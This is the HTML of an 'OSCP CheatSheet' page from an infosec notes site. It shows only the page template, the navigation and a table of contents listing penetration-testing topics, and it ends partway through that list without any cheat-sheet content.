
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://gbarbakadz.github.io/OSCP%20Materials/OSCP_Cheatsheet/">
      
      
        <link rel="prev" href="../../HackTheBox%20Materials/SQL%20Injection%20Fundamentals/">
      
      
        <link rel="next" href="../../eCPPT%20Materials/Linux%20Exploitation/">
      
      
        
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
    
    
      
        <title>OSCP CheatSheet - Infosec Docs</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.618322db.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../Stylesheet/custom.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-orange">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#oscp-cheatsheet" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Infosec Docs" class="md-header__button md-logo" aria-label="Infosec Docs" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m23 11.5-3.05-1.13c-.26-1.15-.91-1.81-.91-1.81a4.19 4.19 0 0 0-5.93 0l-1.48 1.48L5 3c-1 4 0 8 2.45 11.22L2 19.5s8.89 2 14.07-2.05c2.76-2.16 3.38-3.42 3.77-4.75zm-5.29.22c-.39.39-1.03.39-1.42 0a.996.996 0 0 1 0-1.41c.39-.39 1.03-.39 1.42 0s.39 1.02 0 1.41"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Infosec Docs
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              OSCP CheatSheet
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-orange"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Infosec Docs" class="md-nav__button md-logo" aria-label="Infosec Docs" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m23 11.5-3.05-1.13c-.26-1.15-.91-1.81-.91-1.81a4.19 4.19 0 0 0-5.93 0l-1.48 1.48L5 3c-1 4 0 8 2.45 11.22L2 19.5s8.89 2 14.07-2.05c2.76-2.16 3.38-3.42 3.77-4.75zm-5.29.22c-.39.39-1.03.39-1.42 0a.996.996 0 0 1 0-1.41c.39-.39 1.03-.39 1.42 0s.39 1.02 0 1.41"/></svg>

    </a>
    Infosec Docs
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Notes of Ertaoz Bregvadze
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    HackTheBox Materials
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    HackTheBox Materials
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Active Directory Enumeration/Attacks
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../HackTheBox%20Materials/Attacking%20Web%20Applications%20with%20FFUF/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Attacking Web Applications with FFUF
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    File Inclusion/Path Traversal
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../HackTheBox%20Materials/Getting%20Started%20-%20General/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Getting Started - General
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../HackTheBox%20Materials/Login%20Brute%20Forcing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Login Brute Forcing Cheat Sheet
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../HackTheBox%20Materials/SQL%20Injection%20Fundamentals/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SQL Injection
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    OSCP Materials
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    OSCP Materials
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    OSCP CheatSheet
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    OSCP CheatSheet
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#information-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      
        Information gathering
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Information gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#passive-information-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      
        Passive Information Gathering
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Passive Information Gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#passive-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Passive Enumeration
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#llm-powered-passive-information-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      
        LLM-Powered Passive Information Gathering
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LLM-Powered Passive Information Gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#passive-llm-aided-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Passive LLM-Aided enumeration
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-information-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Information Gathering
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Information Gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#port-scanning-with-nmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Port Scanning with Nmap
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        SMB Enumeration
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smtp-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        SMTP Enumeration
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snmp-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        SNMP Enumeration
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#llm-powered-active-information-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      
        LLM-Powered Active Information Gathering
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LLM-Powered Active Information Gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#active-llm-aided-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active LLM-Aided enumeration
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerability-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      
        Vulnerability Scanning
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability Scanning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#vulnerability-scanning-with-nessus" class="md-nav__link">
    <span class="md-ellipsis">
      
        Vulnerability Scanning with Nessus
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability Scanning with Nessus">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#installing-nessus" class="md-nav__link">
    <span class="md-ellipsis">
      
        Installing Nessus
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-scanning-with-nmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Vulnerability Scanning with Nmap
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability Scanning with Nmap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nse-vulnerability-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      
        NSE Vulnerability Scripts
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction-to-web-application-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Introduction to Web Application Attacks
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Introduction to Web Application Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#web-application-assessment-tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Web Application Assessment Tools
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-application-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Web Application Enumeration
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cross-site-scripting" class="md-nav__link">
    <span class="md-ellipsis">
      
        Cross-Site Scripting
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#common-web-application-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Common Web Application Attacks
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Common Web Application Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#directory-traversal" class="md-nav__link">
    <span class="md-ellipsis">
      
        Directory Traversal
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-inclusion-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      
        File Inclusion Vulnerabilities
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="File Inclusion Vulnerabilities">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#local-file-inclusion-lfi" class="md-nav__link">
    <span class="md-ellipsis">
      
        Local File Inclusion (LFI)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php-wrappers" class="md-nav__link">
    <span class="md-ellipsis">
      
        PHP Wrappers
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-file-inclusion-rfi" class="md-nav__link">
    <span class="md-ellipsis">
      
        Remote File Inclusion (RFI)
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-upload-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      
        File Upload Vulnerabilities
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="File Upload Vulnerabilities">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-executable-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Using Executable Files
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-non-executable-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Using Non-Executable Files
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-injection" class="md-nav__link">
    <span class="md-ellipsis">
      
        Command Injection
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sql-injection-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        SQL Injection Attacks
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SQL Injection Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-theory-and-databases" class="md-nav__link">
    <span class="md-ellipsis">
      
        SQL Theory and Databases
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SQL Theory and Databases">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#db-types-and-characteristics" class="md-nav__link">
    <span class="md-ellipsis">
      
        DB Types and Characteristics
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manual-sql-exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      
        Manual SQL Exploitation
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Manual SQL Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#error-based-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      
        Error-based Payloads
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#union-based-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      
        UNION-based Payloads
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#blind-sql-injections" class="md-nav__link">
    <span class="md-ellipsis">
      
        Blind SQL Injections
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manual-and-automated-code-execution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Manual and Automated Code Execution
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Manual and Automated Code Execution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#manual-code-execution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Manual Code Execution
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#automating-the-attack" class="md-nav__link">
    <span class="md-ellipsis">
      
        Automating the Attack
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#client-side-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Client-side Attacks
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Client-side Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#target-reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      
        Target Reconnaissance
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Target Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#information-gathering_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Information Gathering
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#client-fingerprinting" class="md-nav__link">
    <span class="md-ellipsis">
      
        Client Fingerprinting
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-microsoft-office" class="md-nav__link">
    <span class="md-ellipsis">
      
        Exploiting Microsoft Office
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploiting Microsoft Office">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#preparing-the-attack" class="md-nav__link">
    <span class="md-ellipsis">
      
        Preparing the Attack
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leveraging-microsoft-word-macros" class="md-nav__link">
    <span class="md-ellipsis">
      
        Leveraging Microsoft Word Macros
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abusing-windows-library-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Abusing Windows Library Files
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Abusing Windows Library Files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#obtaining-code-execution-via-windows-library-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Obtaining Code Execution via Windows Library Files
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#locating-public-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      
        Locating Public Exploits
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fixing-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      
        Fixing Exploits
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Fixing Exploits">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fixing-memory-corruption-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      
        Fixing Memory Corruption Exploits
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Fixing Memory Corruption Exploits">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#buffer-overflow-in-a-nutshell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Buffer Overflow in a Nutshell
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cross-compiling-exploit-code" class="md-nav__link">
    <span class="md-ellipsis">
      
        Cross-Compiling Exploit Code
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#phishing-basics" class="md-nav__link">
    <span class="md-ellipsis">
      
        Phishing Basics
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phishing Basics">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#payloads-misdirection-and-speedbumps" class="md-nav__link">
    <span class="md-ellipsis">
      
        Payloads, Misdirection, and Speedbumps
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hands-on-credential-phishing" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hands-On Credential Phishing
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Password Attacks
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Password Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attacking-network-services-logins" class="md-nav__link">
    <span class="md-ellipsis">
      
        Attacking Network Services Logins
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-cracking-fundamentals" class="md-nav__link">
    <span class="md-ellipsis">
      
        Password Cracking Fundamentals
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Password Cracking Fundamentals">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#introduction-to-encryption-hashes-and-cracking" class="md-nav__link">
    <span class="md-ellipsis">
      
        Introduction to Encryption, Hashes and Cracking
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mutating-wordlists" class="md-nav__link">
    <span class="md-ellipsis">
      
        Mutating Wordlists
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-manager" class="md-nav__link">
    <span class="md-ellipsis">
      
        Password Manager
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-private-key-passphrase" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Private Key Passphrase
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#working-with-password-hashes" class="md-nav__link">
    <span class="md-ellipsis">
      
        Working with Password Hashes
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Working with Password Hashes">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ntlm-netntlmv2" class="md-nav__link">
    <span class="md-ellipsis">
      
        NTLM / NetNTLMv2
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-credential-guard" class="md-nav__link">
    <span class="md-ellipsis">
      
        Windows Credential Guard
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#antivirus-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Antivirus Evasion
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Antivirus Evasion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bypassing-antivirus-detections" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bypassing Antivirus Detections
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Bypassing Antivirus Detections">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#on-disk-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      
